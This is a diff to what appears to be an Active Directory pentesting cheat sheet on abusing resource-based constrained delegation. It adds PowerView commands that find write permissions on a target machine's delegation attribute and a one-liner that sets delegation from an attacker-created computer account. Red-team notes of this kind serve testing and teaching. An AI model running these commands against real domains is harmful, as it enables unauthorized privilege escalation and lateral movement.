@@ -111,6 +111,12 @@ To abuse RBCD we need Write permissions over the target machine `msDS-AllowedToA
 ```powershell
 # Check if allowed to create machines
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select ms-ds-machineaccountquota
+
+# Check Write premissions to modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute on target machine
+Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+
+# Check if RBCD is set using PowerView - This can be used to verify also
+Get-DomainRBCD  
 ```
 
 ### Exploitation
@@ -135,6 +141,8 @@ $ComputerSid = Get-DomainComputer $FakeComputer -Properties objectsid | Select -
 $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 
+# One liner using PowerView
+Set-DomainRBCD -Identity $TargetComputer -DelegateFrom $FakeComputer -Verbose   
 # Using AD Module
 Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $FakeComputer 
 
